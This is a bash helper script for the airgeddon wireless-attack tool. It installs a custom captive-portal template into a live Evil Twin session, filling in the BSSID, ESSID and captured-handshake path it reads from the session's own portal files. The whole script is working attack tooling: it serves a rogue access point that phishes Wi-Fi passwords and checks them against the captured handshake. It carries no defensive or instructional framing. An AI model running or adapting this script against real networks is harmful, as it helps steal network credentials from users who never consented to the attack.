#!/usr/bin/env bash
# Deploys a custom captive portal template into a running airgeddon Evil Twin
# session's live web directory, filling in the real BSSID and handshake path
# that airgeddon already generated for this session.
#
# Usage: ./deploy_portal.sh "<Template Folder>" "/tmp/ag<N>/www/"
#
# Example:
#   ./deploy_portal.sh "Default Template" "/tmp/ag1234/www/"

set -euo pipefail

template_dir="${1:?Usage: $0 <template-folder> <target-www-dir>}"
target_dir="${2:?Usage: $0 <template-folder> <target-www-dir>}"

[[ "${target_dir}" == */ ]] || target_dir="${target_dir}/"

orig_check="${target_dir}check.htm"
orig_index="${target_dir}index.htm"

if [[ ! -f "${orig_check}" ]]; then
	echo "Error: ${orig_check} not found. Start the Evil Twin attack in airgeddon first, before running this script." >&2
	exit 1
fi

if [[ ! -f "${orig_index}" ]]; then
	echo "Error: ${orig_index} not found. Start the Evil Twin attack in airgeddon first, before running this script." >&2
	exit 1
fi

line=$(grep -m1 'aircrack-ng -a 2 -b' "${orig_check}") || {
	echo "Error: could not find the aircrack-ng line in ${orig_check}." >&2
	exit 1
}

bssid=$(grep -oE '[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}' <<< "${line}" | head -1)
handshake=$(grep -oE '"[^"]+"' <<< "${line}" | sed -n '2p' | tr -d '"')

if [[ -z "${bssid}" || -z "${handshake}" ]]; then
	echo "Error: could not extract BSSID/handshake path from:" >&2
	echo "  ${line}" >&2
	exit 1
fi

essid_line=$(grep -m1 '<span class="bold">' "${orig_index}") || {
	echo "Error: could not find the ESSID line in ${orig_index}." >&2
	exit 1
}
essid=$(sed -E 's/.*<span class="bold">(.*)<\/span>.*/\1/' <<< "${essid_line}")

if [[ -z "${essid}" ]]; then
	echo "Error: could not extract ESSID from:" >&2
	echo "  ${essid_line}" >&2
	exit 1
fi

echo "Detected BSSID:     ${bssid}"
echo "Detected handshake: ${handshake}"
echo "Detected ESSID:     ${essid}"
echo "Deploying '${template_dir}' into ${target_dir}"

# Escape backslash, ampersand and the sed delimiter so arbitrary BSSID/handshake/ESSID
# values can't break or inject into the sed command.
sed_escape() {
	sed -e 's/[\&#]/\\&/g' <<< "$1"
}

bssid_esc=$(sed_escape "${bssid}")
handshake_esc=$(sed_escape "${handshake}")
target_dir_esc=$(sed_escape "${target_dir}")
essid_esc=$(sed_escape "${essid}")

sed \
	-e "s#\${bssid}#${bssid_esc}#g" \
	-e "s#\${et_handshake}#${handshake_esc}#g" \
	-e "s#\${tmpdir}\${webdir}#${target_dir_esc}#g" \
	"${template_dir}/check.htm" > "${target_dir}check.htm"

sed \
	-e "s#\${essid}#${essid_esc}#g" \
	"${template_dir}/index.htm" > "${target_dir}index.htm"

cp "${template_dir}/portal.css" "${target_dir}portal.css"
cp "${template_dir}/portal.js" "${target_dir}portal.js"

echo "Done."
